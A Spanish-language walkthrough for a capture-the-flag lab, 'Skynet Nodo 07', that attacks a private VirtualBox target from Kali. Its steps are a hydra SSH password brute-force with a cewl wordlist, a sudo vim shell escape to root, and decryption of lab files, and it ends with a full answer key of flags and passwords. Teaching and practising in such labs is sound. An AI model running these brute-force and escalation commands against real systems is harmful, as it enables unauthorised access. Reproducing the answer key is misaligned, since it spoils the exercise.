# CYBERQUEST «Skynet :: Nodo 07» — Guía completa paso a paso

> Guía para cualquier persona, sin conocimientos previos. Todo se hace en la
> **máquina Kali** (el atacante). La víctima **no se toca**: solo se lee por
> internet interno (web y SSH).

---

## 0. Cómo funciona la actividad (léelo primero)

- Hay **dos máquinas virtuales**:
  - **Víctima `Skynet-Nodo07`** → `10.10.10.7`. Es el objetivo. / "la intranet".
  - **Atacante `kali_ciber_david`** → `10.10.10.2`. Es TU máquina de trabajo.
- Ambas están en una red interna privada (`10.10.10.0/24`) de VirtualBox.
- El atacante **no puede** escribir ni instalar nada en la víctima. La lee por
  red: su web (`http://10.10.10.7`) y su SSH (`ssh ...@10.10.10.7`).
- Los comandos se escriben **siempre en la Kali**, en una terminal (ventana
  negra).
- La consola/pantalla de la víctima **no se usa nunca** (no tiene login por
  teclado; es normal que "no deje escribir"). ¡Nada de mirar su pantalla!

---

## 1. Arrancar el laboratorio (en Windows)

1. Enciende las dos máquinas:
   ```powershell
   VBoxManage startvm "kali_ciber_david"
   VBoxManage startvm Skynet-Nodo07
   ```
2. Espera 2-3 minutos (arranque completo).
3. Abre la ventana de la Kali y **entra con tu usuario y contraseña de Kali**.
4. Abre una **terminal** en la Kali (icono negro del escritorio).
5. En la terminal, comprueba que alcanzas a la víctima:
   ```bash
   ping -c 3 10.10.10.7
   ```
   Debe responder. Si no responde → revisa el *Anexo B*.

> Truco VirtualBox: **haz clic dentro de la ventana** de la VM para capturar el
> teclado, y suelta el ratón con **Ctrl derecho**.

---

## 2. Preparar la Kali (solo la primera vez)

1. Crea una carpeta de trabajo y entra en ella:
   ```bash
   mkdir skynet-tools
   cd skynet-tools
   ```
2. Descarga las 3 herramientas del atacante (necesitan internet en la Kali):
   ```bash
   wget https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/resistance_steg.py
   wget https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/rsa_tool.py
   wget https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/dir.txt
   ```
   Comprueba: `ls` → debe mostrar `dir.txt  resistance_steg.py  rsa_tool.py`.
3. Comprueba que los programas del ataque están instalados:
   ```bash
   which nmap gobuster exiftool cewl hydra wget 7z openssl python3
   ```
   Si alguno sale en blanco, instálalo (pide tu contraseña de Kali):
   ```bash
   sudo apt update
   sudo apt install -y nmap gobuster libimage-exiftool-perl cewl hydra p7zip-full
   ```

> A partir de aquí, antes de cada paso entra en la carpeta:
> `cd skynet-tools`

---

## 3. Misión P1 · Reconocimiento (ver qué tiene la víctima)

`nmap` escanea los "servicios" (puertos) abiertos de la víctima.
```bash
nmap -sV -sC 10.10.10.7
```
Espera:
- `22/tcp` → SSH (servicio para entrar por terminal remota).
- `80/tcp` → HTTP (servidor web de la intranet).

---

## 4. Misión P2 · Descubrir páginas ocultas (gobuster)

El servidor web no lista archivos; `gobuster` **adivina** nombres de páginas
usando la wordlist `dir.txt` (lista local de nombres probables).
```bash
gobuster dir -u http://10.10.10.7 -w dir.txt
```
Espera → aparecen rutas como `/robots.txt`, `/personal.html`, `/archivo/`,
`/nucleo/`, `/admin/`.

> Regla de oro: **todas las URLs del reto empiezan con `http://`** (nunca
> `https://`). Si algo "no conecta", revisa que no se haya colado una "s".

---

## 5. Misión P3 · La bandera del robots.txt (F2)

`robots.txt` es un fichero que usan los buscadores; aquí filtra información.
```bash
curl -s http://10.10.10.7/robots.txt
```
Espera → `Fragmento_2=NucleoRojo{RU5DSUEgVEk}`

**Anota:** **F2 = `NucleoRojo{RU5DSUEgVEk}`**

---

## 6. Misión P4 · Ingeniería social (leer a los empleados)

1. Página personal:
   ```bash
   curl -s http://10.10.10.7/personal.html
   ```
   Sale el perfil de **Miles Dyson** y la empresa **Cyberdyne**.
2. Página de administración (tiene el usuario y un comentario clave):
   ```bash
   curl -s http://10.10.10.7/admin/
   ```
   Aparece el usuario **`dyson_m`** y la pista de que la clave SSH es la misma
   de siempre (el nombre de la compañía que dio origen a todo: **Cyberdyne**).

---

## 7. Misión P5 · Crear el diccionario y descubrir la contraseña SSH

`cewl` extrae las palabras de la web y las guarda en `palabras.txt`:
```bash
cd skynet-tools
cewl http://10.10.10.7 -m 5 -d 2 -w palabras.txt
```
Comprueba que contiene la palabra clave:
```bash
grep -i cyberdyne palabras.txt
```
Si no aparece, añádela a mano:
```bash
echo Cyberdyne >> palabras.txt
```
`hydra` prueba cada palabra como contraseña del usuario `dyson_m` por SSH:
```bash
hydra -l dyson_m -P palabras.txt ssh://10.10.10.7 -t 4
```
Espera → `[22][ssh] host: 10.10.10.7  login: dyson_m  password: Cyberdyne`

**Credenciales SSH:** `dyson_m` / `Cyberdyne`

> Aclaración: `palabras.txt` **se crea** con `cewl`. No se descarga de ningún
> sitio. Si el fichero "no existe" es porque aún no lo has generado.

---

## 8. Misión P6 · Entrar por SSH y ver la casa de Dyson

SSH conecta por terminal a la víctima usando esas credenciales:
```bash
ssh dyson_m@10.10.10.7
```
- Te pregunta contraseña → escribe `Cyberdyne` (no se ve mientras escribes).
- Puede preguntar "continue connecting? (yes/no)" → escribe `yes`.

Ya dentro, explora:
```bash
ls            # documentos personales
ls nucleo/    # llave_privada.txt (material cifrado del núcleo)
cat bastion/pista1.txt
cat Documentos/pista2.txt
```
Sal (vuelve a la Kali):
```bash
logout
```

---

## 9. Misión P7 · Descargar el material de la intranet

Descarga de la web de la víctima las evidencias y el material cifrado
(**con `http://`, nunca `https://`**):
```bash
cd skynet-tools
wget http://10.10.10.7/archivo/evidencias/captura_terminador.jpg
wget http://10.10.10.7/archivo/evidencias/bandera_nodo.zip
wget http://10.10.10.7/nucleo/nucleo.conf
wget http://10.10.10.7/nucleo/nucleo.conf.enc
wget http://10.10.10.7/nucleo/ruido.enc
```
Comprueba: `ls` → deben estar los 5 ficheros.

---

## 10. Misión M1 · Esteganografía y metadatos (F1)

1. Los **metadatos** (EXIF) de la foto guardan una bandera:
   ```bash
   exiftool captura_terminador.jpg | grep -i description
   ```
   Especha `Image Description : NucleoRojo{TEEgUkVTSVNU}`

   **Anota:** **F1 = `NucleoRojo{TEEgUkVTSVNU}`**

2. La foto oculta además un mensaje en su interior (esteganografía DCT).
   Extrae la transmisión interceptada:
   ```bash
   python3 resistance_steg.py captura_terminador.jpg
   ```
   Especha → análisis del analista «OJODEDIOS» y una **pregunta**:
   *¿Cuál es el nombre de la persona que está al lado del Terminator?*
   > Ayuda: escena del T2 → **John Connor**. Es la contraseña del ARCA.

---

## 11. Misión M4 · Abrir el Arca (zip cifrado) → F4

El zip está cifrado con AES (método 99); `unzip` no lo soporta. Usa **7-Zip**:
```bash
7z x -p"John Connor" bandera_nodo.zip
```
El comando extrae `bandera.jpg` y `pista4.txt`. Mira la bandera del arca:
```bash
exiftool bandera.jpg | grep -i description
```
Especha `NucleoRojo{UyBST1NUUk9T}`

  **Anota:** **F4 = `NucleoRojo{UyBST1NUUk9T}`**

Además:
```bash
cat pista4.txt      # pista para escalar privilegios (sudo + vim)
```

---

## 12. Misión M3 · Criptografía híbrida → F3 y la ORDEN

1. Recupera la llave privada del home de Dyson (aún estás en la Kali):
   ```bash
   scp dyson_m@10.10.10.7:~/nucleo/llave_privada.txt .
   ```
   (contraseña: `Cyberdyne`).

2. Con la llave, `rsa_tool` descifra el `nucleo.conf` cifrado y saca la clave
   de sesión:
   ```bash
   python3 rsa_tool.py llave_privada.txt nucleo.conf nucleo.conf.enc
   ```
   Especha → **`S3kiRa-07`**

3. Esa clave abre el archivo `ruido.enc` (cifrado AES-256-CBC):
   ```bash
   openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -pass pass:S3kiRa-07 -in ruido.enc -out orden.txt
   cat orden.txt
   ```
   Sale `FRAGMENTO_3=NucleoRojo{RU5FIE1VQ0hP}` y una cadena base64.

   **Anota:** **F3 = `NucleoRojo{RU5FIE1VQ0hP}`**

4. La cadena se decodifica **dos veces** con base64:
   ```bash
   echo "Uld3Z1lYUmhjWFZsSUdWeklHRWdiR0Z6SURRNk1EQT0=" | base64 -d | base64 -d
   ```
   Sale **`El ataque es a las 4:00`** → esa es la **ORDEN NUCLEAR**.

---

## 13. Misión M5 · Escalada a root → F5

1. Entra de nuevo por SSH:
   ```bash
   ssh dyson_m@10.10.10.7     # contraseña: Cyberdyne
   ```
2. Mira qué puedes ejecutar como administrador sin contraseña:
   ```bash
   sudo -l
   ```
   Sale: `(root) NOPASSWD: /usr/bin/vim, /usr/bin/vi`
3. `vim` permite abrir una terminal (técnica "escape del editor"):
   ```bash
   sudo vim -c ':!/bin/bash'
   ```
   Quedas con una consola de **root**.
4. Lee la última bandera:
   ```bash
   cat /root/nucleo/FLAG5.txt
   ```
   Especha `NucleoRojo{XzAxMTA}`

   **Anota:** **F5 = `NucleoRojo{XzAxMTA}`**

---

## 14. Misión final · Validar el núcleo

Ejecuta el validador:
```bash
sudo /root/nucleo/nucleo.sh
```
Te pedirá los 5 fragmentos, **en orden** y con el formato `NucleoRojo{...}`,
uno por línea (F1, F2, F3, F4, F5), y luego la ORDEN. Pega:

```
NucleoRojo{TEEgUkVTSVNU}
NucleoRojo{RU5DSUEgVEk}
NucleoRojo{RU5FIE1VQ0hP}
NucleoRojo{UyBST1NUUk9T}
NucleoRojo{XzAxMTA}
```
y como ORDEN: `El ataque es a las 4:00`.

Especha:
```
FRASE RECONSTRUIDA (ADN): LA RESISTENCIA TIENE MUCHOS ROSTROS_0110
>>> NUCLEO VERIFICADO CON EXITO <<<
```

¡Misión completada!

---

## Anexo A · Datos de referencia (imprimir)

| Dato | Valor |
|---|---|
| Víctima web | `http://10.10.10.7` |
| SSH | `dyson_m` / `Cyberdyne` |
| Password del ARCA (zip) | `John Connor` |
| Clave de sesión (RSA) | `S3kiRa-07` |
| ORDEN NUCLEAR | `El ataque es a las 4:00` |
| F1 | `NucleoRojo{TEEgUkVTSVNU}` |
| F2 | `NucleoRojo{RU5DSUEgVEk}` |
| F3 | `NucleoRojo{RU5FIE1VQ0hP}` |
| F4 | `NucleoRojo{UyBST1NUUk9T}` |
| F5 | `NucleoRojo{XzAxMTA}` |
| ADN | `LA RESISTENCIA TIENE MUCHOS ROSTROS_0110` |
| Escalada | `sudo vim -c ':!/bin/bash'` |

## Anexo B · Problemas frecuentes

| Síntoma | Causa | Solución |
|---|---|---|
| No responde 10.10.10.7 | Víctima apagada o a medio arrancar | `VBoxManage startvm Skynet-Nodo07`; esperar 2-3 min |
| La Kali no hace ping | La Kali sin IP 10.10.10.x | `sudo dhclient enp0s8` (o mira `ip a`) |
| "unsupported protocol scheme" | URL mal escrita (falta `://`) | Usar `http://10.10.10.7` exacto |
| wget "connection timed out :443" | Se puso `https://` (puerto 443) | Cambiar a `http://` |
| `unzip` "compression method 99" | Zip cifrado AES | Usar `7z x -p"John Connor" archivo.zip` |
| exiftool no muestra nada con "comment" | La bandera está en "Image Description" | `grep -i description` |
| "palabras.txt no existe" | Aún no se ha generado | Ejecutar primero `cewl ... -w palabras.txt` |
| No encuentro la tecla `~` | Teclado español | Evitar `~`: usar la carpeta `skynet-tools` directamente |
| No "deja escribir" en la consola de la víctima | Es normal (no tiene login por teclado) | No usar esa consola; entrar por SSH desde la Kali |